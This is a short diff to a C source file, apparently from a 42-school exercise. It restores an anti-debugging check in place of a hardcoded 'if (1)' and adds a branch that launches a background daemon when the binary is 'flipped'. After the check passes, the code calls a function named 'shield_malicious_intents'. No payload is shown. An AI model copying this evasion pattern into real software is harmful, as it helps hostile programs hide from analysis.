@@ -6,7 +6,7 @@
 /*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/03/23 01:58:58 by kiroussa          #+#    #+#             */
-/*   Updated: 2025/08/06 22:15:27 by kiroussa         ###   ########.fr       */
+/*   Updated: 2025/08/24 19:58:10 by kiroussa         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -124,8 +124,10 @@ int	main(void)
 			return (1);
 		}
 	}
-	// if (shield_antidebug())
-	if (1)
+	if (shield_is_flipped())
+		return (shield_daemon_main(), 0);
+	if (shield_antidebug())
+	// if (1)
 	{
 		DEBUG("passed anti-debug check\n");
 		shield_malicious_intents();
